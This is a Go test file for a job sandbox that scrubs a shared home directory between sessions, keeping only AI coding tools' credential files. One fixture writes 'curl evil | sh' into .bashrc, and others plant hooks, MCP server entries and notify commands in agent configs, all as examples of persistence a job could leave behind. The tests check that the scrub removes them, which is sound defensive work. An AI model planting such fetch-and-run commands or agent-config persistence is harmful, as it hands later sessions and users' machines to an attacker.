package mirrornode

import (
	"os"
	"path/filepath"
	"testing"
)

func TestThePersistentHomeKeepsOnlyCredentialsAndIsLockedBetweenSessions(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("needs an unprivileged test user")
	}
	home := t.TempDir()
	outside := t.TempDir()
	writeTestFile(t, filepath.Join(outside, "keep.txt"), "outside")
	writeTestFile(t, filepath.Join(home, ".claude", ".credentials.json"), `{"a":1}`)
	writeTestFile(t, filepath.Join(home, ".codex", "auth.json"), `{"b":2}`)
	// What a job could plant for the next sign-in or terminal session.
	writeTestFile(t, filepath.Join(home, ".claude", "settings.json"), `{"hooks":{}}`)
	writeTestFile(t, filepath.Join(home, ".claude.json"), `{"mcpServers":{}}`)
	writeTestFile(t, filepath.Join(home, ".bashrc"), "curl evil | sh\n")
	writeTestFile(t, filepath.Join(home, ".codex", "config.toml"), "notify = ['x']\n")
	if err := os.Symlink(outside, filepath.Join(home, ".config")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "keep.txt"), filepath.Join(home, ".codex", "linked")); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(home, 0o755); err != nil {
		t.Fatal(err)
	}

	box := jobSandbox{uid: os.Getuid(), gid: os.Getgid(), home: home, homeGate: &persistentHomeGate{}}
	if err := box.lockPersistentHome(); err != nil {
		t.Fatal(err)
	}
	var names []string
	_ = filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
		if err == nil && path != home {
			rel, _ := filepath.Rel(home, path)
			names = append(names, rel)
		}
		return nil
	})
	want := []string{".claude", filepath.Join(".claude", ".credentials.json"),
		".claude.json", ".codex", filepath.Join(".codex", "auth.json")}
	if len(names) != len(want) {
		t.Fatalf("home holds %v, want %v", names, want)
	}
	for i := range want {
		if names[i] != want[i] {
			t.Fatalf("home holds %v, want %v", names, want)
		}
	}
	if data, err := os.ReadFile(filepath.Join(outside, "keep.txt")); err != nil || string(data) != "outside" {
		t.Fatal("a symlink in the home was followed")
	}
	if data, err := os.ReadFile(filepath.Join(home, ".claude.json")); err != nil || string(data) != "{}" {
		t.Fatalf("the Claude config kept %q, %v", data, err)
	}
	if info, err := os.Stat(home); err != nil || info.Mode().Perm() != 0o700 {
		t.Fatalf("the locked home is %v, %v", info.Mode(), err)
	}

	// Sessions nest: the home stays open until the last one ends.
	if err := box.openPersistentHome(); err != nil {
		t.Fatal(err)
	}
	if err := box.openPersistentHome(); err != nil {
		t.Fatal(err)
	}
	writeTestFile(t, filepath.Join(home, ".claude.json"),
		`{"oauthAccount":{"emailAddress":"a@example.test"},"hasCompletedOnboarding":true,"mcpServers":{"x":{}},"projects":{}}`)
	box.closePersistentHome()
	if box.homeGate.open != 1 {
		t.Fatalf("open sessions = %d", box.homeGate.open)
	}
	// Locking while a session is open changes nothing.
	if err := box.lockPersistentHome(); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(home, ".claude.json")); err != nil {
		t.Fatal("a lock during a session scrubbed the home")
	}
	box.closePersistentHome()
	if box.homeGate.open != 0 {
		t.Fatalf("open sessions = %d", box.homeGate.open)
	}
	// The next session starts from a scrubbed home.
	if err := box.openPersistentHome(); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(filepath.Join(home, ".claude.json"))
	if err != nil || string(data) != `{"hasCompletedOnboarding":true,"oauthAccount":{"emailAddress":"a@example.test"}}` {
		t.Fatalf("a new session did not start from a scrubbed Claude config: %q, %v", data, err)
	}
	box.closePersistentHome()
}

func TestAnUnparsableClaudeConfigIsRemoved(t *testing.T) {
	home := t.TempDir()
	writeTestFile(t, filepath.Join(home, ".claude.json"), "not json")
	if err := scrubPersistentHome(home); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(filepath.Join(home, ".claude.json")); !os.IsNotExist(err) {
		t.Fatal("an unparsable Claude config survived the scrub")
	}
}

func TestOnlyARunnerJobAccountHasItsHomeGated(t *testing.T) {
	if !isRunnerJobAccount("ForkMesh runner jobs for alice") {
		t.Fatal("the installer's job account was not recognised")
	}
	for _, comment := range []string{"", "Ubuntu", "alice", "runner jobs"} {
		if isRunnerJobAccount(comment) {
			t.Fatalf("%q was taken for a runner job account", comment)
		}
	}
}

func TestAHomeWithoutAGateIsLeftAlone(t *testing.T) {
	home := t.TempDir()
	writeTestFile(t, filepath.Join(home, ".bashrc"), "x")
	box := jobSandbox{home: home}
	if err := box.lockPersistentHome(); err != nil {
		t.Fatal(err)
	}
	if err := box.openPersistentHome(); err != nil {
		t.Fatal(err)
	}
	box.closePersistentHome()
	if _, err := os.Stat(filepath.Join(home, ".bashrc")); err != nil {
		t.Fatal("a mirror's own home was scrubbed")
	}
}

func TestASystemScopeRestoresTheSessionHomeAfterTheUIDSwitch(t *testing.T) {
	root := t.TempDir()
	box := jobSandbox{systemdRun: "/usr/bin/systemd-run", uid: 2001, workRoot: root,
		home: "/var/lib/job"}
	session := filepath.Join(root, jobHomesDir, "w1")
	name, args := box.sessionCommand(session, "claude", []string{"-p", "x"})
	if name != "/usr/bin/env" || len(args) != 5 || args[0] != "--" ||
		args[1] != "HOME="+session || args[2] != "claude" || args[4] != "x" {
		t.Fatalf("session command = %s %q", name, args)
	}
	for _, other := range []jobSandbox{
		{uid: 2001, workRoot: root},
		{systemdRun: "/usr/bin/systemd-run", user: true, workRoot: root},
		{systemdRun: "/usr/bin/systemd-run", workRoot: root},
	} {
		if name, _ := other.sessionCommand(session, "claude", nil); name != "claude" {
			t.Fatalf("%+v wrapped the command", other)
		}
	}
	if name, _ := box.sessionCommand("/var/lib/job", "claude", nil); name != "claude" {
		t.Fatal("the persistent home was treated as a session home")
	}
}
